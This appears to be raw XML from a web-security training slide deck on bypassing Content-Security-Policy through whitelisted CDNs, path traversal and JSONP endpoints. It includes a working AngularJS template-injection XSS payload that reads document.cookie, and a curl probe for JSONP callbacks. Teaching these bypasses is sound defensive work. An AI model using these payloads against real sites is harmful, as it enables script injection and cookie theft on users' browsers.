            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7586543" y="5111657"/>
            <a:ext cx="6294834" cy="337780"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>If api.example.com has JSONP endpoints</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7586543" y="5655535"/>
            <a:ext cx="4242673" cy="405408"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3150"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2550" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Path Traversal in Whitelists</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7586543" y="6267040"/>
            <a:ext cx="6294834" cy="337780"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>❌</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> WEAK: script-src 'self' https://trusted.com/scripts/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7586543" y="6790200"/>
            <a:ext cx="6294834" cy="337780"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>If trusted.com allows file uploads anywhere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123593" y="1088112"/>
            <a:ext cx="1635442" cy="313373"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6872"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBE8F0"/>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1225" y="1173004"/>
            <a:ext cx="143470" cy="143470"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1446371" y="1141928"/>
            <a:ext cx="1205032" cy="205740"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>BYPASS TECHNIQUE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123593" y="1458278"/>
            <a:ext cx="7722751" cy="560784"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="325F7B"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technique 1:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Whitelisted CDN Abuse</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123593" y="2231946"/>
            <a:ext cx="179427" cy="224314"/>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latin typeface="MuseoModerno Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123593" y="2514005"/>
            <a:ext cx="4033123" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123593" y="2649379"/>
            <a:ext cx="3158371" cy="280392"/>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Vulnerable CSP Configuration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123593" y="3089434"/>
            <a:ext cx="4033123" cy="783193"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3437"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1114663" y="3089434"/>
            <a:ext cx="4050982" cy="783193"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3437"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1294090" y="3223974"/>
            <a:ext cx="3692128" cy="514112"/>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Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5298638" y="2231946"/>
            <a:ext cx="179427" cy="224314"/>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latin typeface="MuseoModerno Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5298638" y="2514005"/>
            <a:ext cx="4033123" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5298638" y="2649379"/>
            <a:ext cx="2243257" cy="280392"/>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Attack Vector</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5298638" y="3089434"/>
            <a:ext cx="4033123" cy="3096697"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 869"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5289709" y="3089434"/>
            <a:ext cx="4050982" cy="3096697"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 869"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5469136" y="3223974"/>
            <a:ext cx="3692128" cy="2827615"/>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 Load AngularJS from CDN --&gt;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&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"&gt;&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 AngularJS template injection --&gt;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&lt;div ng-app&gt;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  {{constructor.constructor('alert(document.cookie)')()}}</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&lt;/div&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9473684" y="2231946"/>
            <a:ext cx="179427" cy="224314"/>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latin typeface="MuseoModerno Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9473684" y="2514005"/>
            <a:ext cx="4033123" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9473684" y="2649379"/>
            <a:ext cx="2243257" cy="280392"/>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Why It Works</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9473684" y="3014901"/>
            <a:ext cx="4033123" cy="1028688"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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AngularJS is whitelisted via CDN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>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AngularJS evaluates expressions in {{ }}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>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Bypasses CSP because script comes from trusted source</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1123593" y="6381500"/>
            <a:ext cx="12383214" cy="661154"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4072"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C9DDE9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="23" name="Image 1" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1303020" y="6631531"/>
            <a:ext cx="224314" cy="179427"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1706761" y="6568190"/>
            <a:ext cx="11620619" cy="257056"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Key Insight:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Even trusted CDNs can host libraries with dangerous features that enable CSP bypasses through template injection or expression evaluation.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402449" y="411837"/>
            <a:ext cx="1033105" cy="176689"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7703"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DBE8F0"/>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70434" y="454819"/>
            <a:ext cx="90726" cy="90726"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3606522" y="445770"/>
            <a:ext cx="761048" cy="108823"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>BYPASS TECHNIQUE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="611148"/>
            <a:ext cx="5730954" cy="354330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="325F7B"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technique 2:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> JSONP Endpoint Exploitation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1107162"/>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Vulnerable CSP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1383506"/>
            <a:ext cx="3774400" cy="306110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5558"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="1383506"/>
            <a:ext cx="3785592" cy="306110"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5558"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="1468517"/>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script-src 'self' https://api.example.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1753314"/>
            <a:ext cx="2093238"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Finding JSONP Endpoints</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="2029658"/>
            <a:ext cx="3774400" cy="850463"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="2029658"/>
            <a:ext cx="3785592" cy="850463"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="2114669"/>
            <a:ext cx="3558897" cy="680442"/>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Test for JSONP</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curl "https://api.example.com/user?callback=test"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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Response:</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test({"user":"admin","role":"admin"})</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7461171" y="1107162"/>
